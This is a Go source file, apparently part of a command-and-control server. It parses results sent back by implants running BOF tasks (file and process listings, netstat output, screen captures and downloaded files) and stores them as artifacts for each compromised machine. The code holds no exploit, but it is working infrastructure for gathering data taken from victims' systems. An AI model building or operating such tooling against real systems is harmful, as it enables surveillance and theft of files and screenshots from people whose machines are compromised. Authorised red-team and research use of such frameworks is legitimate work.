package main

// captureArtifact inspects a BOF's output and persists a per-agent artifact
// (file_list/proc_list -> text meta; screenshot/file_download -> decoded blob).
// Called from session.go::readLoop when a BOF task completes with output.
//
// The BOF output formats (from examples/*.c) are:
//   file_list:    "CWD: <path>\r\nD\tname\tsize\tepoch\r\n..." (text -> meta)
//   proc_list:    "name\tpid\tppid\tthreads\r\n..."           (text -> meta)
//   netstat:      "PROTO\tLOCAL\tREMOTE\tPID\tSTATE\r\n..."    (text -> meta)
//   screenshot:   "=== SCREENSHOT: <W>x<H> ===\n<b64 BMP>"     (decode -> blob)
//   file_download:"=== FILE: <path> (n bytes) ===\r\n<b64>"   (decode -> blob)
//
// Best-effort: a parse failure is logged but never breaks the session.

import (
	"encoding/base64"
	"strings"
)

func captureArtifact(bofName string, implantID uint64, output string) {
	switch bofName {
	case "file_list":
		// path is the CWD: line if present
		path := ""
		if strings.HasPrefix(output, "CWD:") {
			nl := strings.IndexAny(output, "\r\n")
			if nl < 0 {
				nl = len(output)
			}
			path = strings.TrimSpace(output[4:nl])
		}
		store.PutArtifact(implantID, KindFileList, path, output, nil)

	case "proc_list":
		store.PutArtifact(implantID, KindProcList, "", output, nil)

	case "netstat":
		store.PutArtifact(implantID, KindNetList, "", output, nil)

	case "screenshot":
		blob, ok := extractB64Body(output, "=== SCREENSHOT:")
		if ok {
			store.PutArtifact(implantID, KindScreenshot, "", "", blob)
		} else {
			store.PutArtifact(implantID, KindScreenshot, "", output, nil)
		}

	case "file_download":
		// header line: "=== FILE: <path> (<n bytes>) ==="
		path := ""
		if strings.HasPrefix(output, "=== FILE:") {
			nl := strings.IndexAny(output, "\r\n")
			if nl < 0 {
				nl = len(output)
			}
			hdr := output[:nl]
			// extract path between "=== FILE: " and " ("
			rest := strings.TrimPrefix(hdr, "=== FILE:")
			rest = strings.TrimSpace(rest)
			if i := strings.LastIndex(rest, " ("); i >= 0 {
				path = strings.TrimSpace(rest[:i])
			} else {
				path = rest
			}
		}
		blob, ok := extractB64Body(output, "=== FILE:")
		if ok {
			store.PutArtifact(implantID, KindDownload, path, "", blob)
		} else {
			store.PutArtifact(implantID, KindDownload, path, output, nil)
		}
	}
}

// extractB64Body splits an "=== HEADER ===\n<b64>" output into the base64 body
// and decodes it. marker is e.g. "=== SCREENSHOT:". Returns false if the marker
// isn't found or the decode fails.
func extractB64Body(output, marker string) ([]byte, bool) {
	idx := strings.Index(output, marker)
	if idx < 0 {
		return nil, false
	}
	rest := output[idx:]
	// skip the header line
	nl := strings.IndexAny(rest, "\n")
	if nl < 0 {
		return nil, false
	}
	body := strings.TrimSpace(rest[nl+1:])
	// body may have a trailing newline; base64 ignores whitespace, but StdEncoding
	// doesn't — strip CR/LF.
	body = strings.NewReplacer("\r", "", "\n", "", " ", "").Replace(body)
	dec, err := base64.StdEncoding.DecodeString(body)
	if err != nil || len(dec) == 0 {
		return nil, false
	}
	return dec, true
}
